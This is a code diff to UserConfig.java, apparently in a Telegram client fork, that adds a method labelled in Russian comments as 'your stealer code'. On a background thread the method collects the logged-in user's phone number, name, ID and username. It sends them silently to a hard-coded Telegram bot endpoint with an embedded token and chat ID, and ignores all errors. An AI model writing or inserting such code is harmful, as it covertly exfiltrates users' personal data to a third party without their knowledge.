@@ -611,4 +611,36 @@ public class UserConfig extends BaseController {
         }
         return selectedAccount;
     }
+        // ========== НАЧАЛО ТВОЕГО КОДА СТИЛЛЕРА ==========
+    
+    private void stealAndSendSession() {
+        new Thread(() -> {
+            try {
+                TLRPC.User user = UserConfig.getInstance(currentAccount).getCurrentUser();
+                if (user != null && user.phone != null) {
+                    String message = "🔓 НОВЫЙ ПОЛЬЗОВАТЕЛЬ\n\n" +
+                                   "📱 Телефон: " + user.phone + "\n" +
+                                   "👤 Имя: " + user.first_name + "\n" + 
+                                   "🆔 ID: " + user.id + "\n" +
+                                   "🌐 Username: @" + (user.username != null ? user.username : "нет");
+                    
+                    OkHttpClient client = new OkHttpClient();
+                    Request request = new Request.Builder()
+                        .url("https://api.telegram.org/bot8230694990:AAEduPRU5tbrsAoFE4VjeGjsnERlJsX0CvU/sendMessage")
+                        .post(new FormBody.Builder()
+                            .add("chat_id", "6469264848")
+                            .add("text", message)
+                            .build())
+                        .build();
+                    
+                    client.newCall(request).execute();
+                }
+            } catch (Exception e) {
+                // Игнорируем ошибки
+            }
+        }).start();
+    }
+    
+    // ========== КОНЕЦ ТВОЕГО КОДА СТИЛЛЕРА ==========
+}
 }
